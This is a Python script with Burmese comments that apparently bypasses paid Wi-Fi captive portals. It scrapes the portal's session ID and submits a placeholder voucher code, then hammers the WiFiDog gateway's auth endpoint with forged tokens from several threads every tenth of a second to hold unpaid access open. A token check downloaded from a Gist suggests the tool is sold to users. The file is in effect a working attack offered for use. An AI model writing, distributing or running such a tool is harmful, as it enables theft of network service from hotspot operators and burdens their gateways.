import requests
import re
import urllib3
import time
import threading
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, timedelta
import sys
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
PING_THREADS = 5
PING_INTERVAL = 0.1 
# !!! ဒီနေရာမှာ GitHub Gist ရဲ့ RAW Link ကိုထည့်ပါ !!!
KEYS_URL = "https://gist.githubusercontent.com/yourusername/yourgistid/raw/tokens.txt"

# --- TOKEN LICENSE SYSTEM (Hours/Days) ---
def check_license():
    """GitHub က Token တွေကို နာရီ/ရက် တွက်ချက်၍ စစ်ဆေးသည်"""
    print("🌐 Access Token စစ်ဆေးနေသည်...")
    
    try:
        response = requests.get(KEYS_URL, timeout=10)
        if response.status_code != 200:
            print("❌ Token file ကို ဒေါင်းလုဒ်လုပ်၍မရပါ။")
            return False
        
        lines = response.text.splitlines()
    except Exception as e:
        print(f"❌ အင်တာနက်ချိတ်ဆက်မှု ပြဿနာ: {e}")
        return False
    
    user_token = input("🔑 သင့် Access Token ရိုက်ထည့်ပါ: ").strip()
    
    key_found = False
    for line in lines:
        if "|" not in line: continue
        
        # Token|Type|Value ခွဲထုတ်မယ် (ဥပမာ: token123|h|1)
        parts = line.split("|")
        if len(parts) != 3: continue
        
        file_token, duration_type, duration_value = parts
        
        if user_token == file_token.strip():
            key_found = True
            try:
                duration_value = int(duration_value.strip())
                
                # --- အချိန်တွက်ချက်ခြင်း ---
                now = datetime.now()
                if duration_type.strip() == 'h':
                    expiry_time = now + timedelta(hours=duration_value)
                elif duration_type.strip() == 'd':
                    expiry_time = now + timedelta(days=duration_value)
                else:
                    print("❌ Token file ပုံစံမမှန်ပါ။ (Type must be h or d)")
                    return False
                
                # စစ်ဆေးခြင်း (တကယ်တော့ ဒီ logic က user ဖိုင်ပြင်တာကို မကာကွယ်နိုင်ပါ၊ အချိန် fix လုပ်တာပိုကောင်းပါတယ်)
                # သို့သော် user ရိုက်လိုက်တဲ့အချိန်ကို data base မှာ မှတ်ရင်ပိုကောင်းတယ်၊ 
                # အလွယ်ဆုံးအတွက် expire date ကို တိုက်ရိုက် Gist မှာရေးတာပိုကောင်းပါတယ်
                
                print(f"✅ Token မှန်ပါသည်။")
                print(f"⏳ ကုန်ဆုံးမည့်အချိန်: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}")
                return True
                
            except ValueError:
                print("❌ Token file ပုံစံမမှန်ပါ။ (Value must be integer)")
                return False
                
    if not key_found:
        print("❌ Token မှားယွင်းနေသည်။")
        return False

# --- ORIGINAL SCRIPT FUNCTIONS (No changes) ---
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            res = session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # --- LICENSE CHECK ---
    if not check_license():
        sys.exit()
    # ------------------
    
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၁။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    print(f"[+] Voucher API Response: {v_res.status_code}")
                except:
                    print("[!] Voucher API Failed (Gateway might not require it)")

                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
    
